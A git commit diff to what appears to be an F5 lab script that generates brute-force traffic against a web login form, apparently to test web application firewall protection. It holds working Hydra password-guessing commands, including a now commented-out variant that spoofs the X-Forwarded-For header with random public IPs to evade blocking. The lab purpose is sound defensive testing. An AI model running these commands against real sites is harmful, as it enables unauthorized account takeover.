b7c95d8089b7c6179cf9c1acf49c365f54b1f71e
Roman Jouhannet <r.jouhannet@f5.com>
2019-02-27 17:52:52 -0800

    update 2/27

--- lab/scripts/asm-brute-force/asm_brute_force_attach.sh
+++ lab/scripts/asm-brute-force/asm_brute_force_attach.sh
@@ -25,8 +25,9 @@ do
 
             for i in {1..10}
             do
-                    xff=$(nmap -n -iR 1 --exclude 10.0.0.0/8,172.16.0.0/12,192.168.0.0/16,224-255.-.-.- -sL | grep -o "[0-9]*\.[0-9]*\.[0-9]*\.[0-9]*")
-                    sudo docker run -t -i asm-brute-force hydra -V -L users10.txt -P pass100.txt ${ip:1:-1} https-form-post "/user/login:username=^USER^&password=^PASS^:S=Account:H=X-forwarded-for: $xff"
+                xff=$(nmap -n -iR 1 --exclude 10.0.0.0/8,172.16.0.0/12,192.168.0.0/16,224-255.-.-.- -sL | grep -o "[0-9]*\.[0-9]*\.[0-9]*\.[0-9]*")
+                #sudo docker run -t -i asm-brute-force hydra -V -L users10.txt -P pass100.txt ${ip:1:-1} https-form-post "/user/login:username=^USER^&password=^PASS^:S=Account:H=X-forwarded-for: $xff"
+                sudo docker run -t -i asm-brute-force hydra -V -L users10.txt -P pass100.txt ${ip:1:-1} https-form-post "/user/login:username=^USER^&password=^PASS^:S=Account"
             done
 
         fi
